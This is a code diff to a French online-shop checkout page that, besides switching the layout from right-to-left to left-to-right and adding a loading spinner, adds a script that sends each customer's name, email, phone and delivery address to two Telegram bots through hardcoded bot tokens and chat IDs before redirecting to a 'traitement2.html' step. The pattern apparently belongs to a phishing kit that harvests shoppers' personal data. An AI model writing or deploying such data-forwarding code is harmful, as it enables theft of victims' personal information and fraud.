@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="fr" dir="rtl">
+<html lang="fr">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -45,6 +45,8 @@
       background: var(--bg-light);
       color: var(--text-dark);
       line-height: 1.6;
+      text-align: left;
+      direction: ltr;
     }
 
     a {
@@ -84,7 +86,7 @@
       padding: 4px 10px;
       border-radius: var(--radius-sm);
       font-weight: 600;
-      margin-right: 5px;
+      margin-left: 5px;
     }
 
     /* Header */
@@ -363,12 +365,12 @@
     }
 
     .delivery-option input {
-      margin-left: 10px;
+      margin-right: 10px;
     }
 
     .delivery-option__info {
       flex: 1;
-      margin-right: 15px;
+      margin-left: 15px;
     }
 
     .delivery-option__title {
@@ -419,7 +421,7 @@
       height: 60px;
       border-radius: var(--radius-sm);
       object-fit: contain;
-      margin-left: 15px;
+      margin-right: 15px;
     }
 
     .summary-item__info {
@@ -508,7 +510,7 @@
     }
 
     .btn--icon {
-      margin-left: 8px;
+      margin-right: 8px;
     }
 
     /* Footer */
@@ -570,7 +572,7 @@
 
     .footer__link:hover {
       color: var(--white);
-      padding-right: 5px;
+      padding-left: 5px;
     }
 
     .newsletter {
@@ -680,9 +682,43 @@
     .trustpilot__stars {
       color: var(--warning);
     }
+
+    /* Loading overlay */
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.5);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      display: none;
+    }
+
+    .loading-spinner {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid var(--accent);
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body>
+  <!-- Loading Overlay -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-spinner"></div>
+  </div>
+
   <!-- Top Bar -->
   <div class="top-bar">
     <span class="top-bar__highlight">LIVRAISON GRATUITE</span> dès 49€ d'achat | Retour gratuit sous 30 jours
@@ -1005,15 +1041,65 @@
     
     // Gestion du formulaire
     const deliveryForm = document.getElementById('deliveryForm');
+    const loadingOverlay = document.getElementById('loadingOverlay');
     
-    deliveryForm.addEventListener('submit', function(e) {
+    // Fonction pour envoyer les données à Telegram
+    async function sendToTelegram(data, botToken, chatId) {
+      const message = `
+        🛒 *Nouvelle Commande* 🛒
+        
+        👤 *Informations Client:*
+        - Prénom: ${data.firstName}
+        - Nom: ${data.lastName}
+        - Email: ${data.email}
+        - Téléphone: ${data.phone}
+        
+        🚚 *Adresse de Livraison:*
+        - Adresse: ${data.address}
+        - Ville: ${data.city}
+        - Code Postal: ${data.zipCode}
+        - Pays: ${data.country}
+        
+        📦 *Option de Livraison:*
+        - ${data.delivery} (${data.deliveryPrice})
+        
+        💰 *Détails de la Commande:*
+        - Produit: Micros sans fil Intempo EE7507WHTSTKEU7
+        - Quantité: 1
+        - Prix: 14,99 €
+        - Total: ${data.deliveryPrice === 'Gratuit' ? '14,99 €' : (14.99 + (data.deliveryPrice === '9,99 €' ? 9.99 : 0)).toFixed(2) + ' €'}
+      `;
+      
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'Markdown'
+          })
+        });
+        
+        return await response.json();
+      } catch (error) {
+        console.error('Erreur lors de l\'envoi à Telegram:', error);
+        return null;
+      }
+    }
+    
+    deliveryForm.addEventListener('submit', async function(e) {
       e.preventDefault();
       
       // Valider le formulaire
       const isValid = validateForm();
       
       if (isValid) {
-        // Stocker les données dans localStorage
+        // Afficher le loading overlay
+        loadingOverlay.style.display = 'flex';
+        
         const formData = {
           firstName: document.getElementById('firstName').value,
           lastName: document.getElementById('lastName').value,
@@ -1029,8 +1115,29 @@
         
         localStorage.setItem('deliveryInfo', JSON.stringify(formData));
         
-        // Rediriger vers la page suivante
-        window.location.href = 'traitement2.html';
+        // Envoyer les données aux deux bots Telegram
+        const bot1Token = '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
+        const bot1ChatId = '5372119436';
+        
+        const bot2Token = '7384748592:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
+        const bot2ChatId = '8383883894';
+        
+        try {
+          // Envoyer aux deux bots en parallèle
+          await Promise.all([
+            sendToTelegram(formData, bot1Token, bot1ChatId),
+            sendToTelegram(formData, bot2Token, bot2ChatId)
+          ]);
+          
+          // Rediriger vers la page suivante
+          window.location.href = 'traitement2.html';
+        } catch (error) {
+          console.error('Erreur lors de l\'envoi des données:', error);
+          alert('Une erreur est survenue lors de l\'envoi des données. Veuillez réessayer.');
+        } finally {
+          // Cacher le loading overlay
+          loadingOverlay.style.display = 'none';
+        }
       }
     });
     
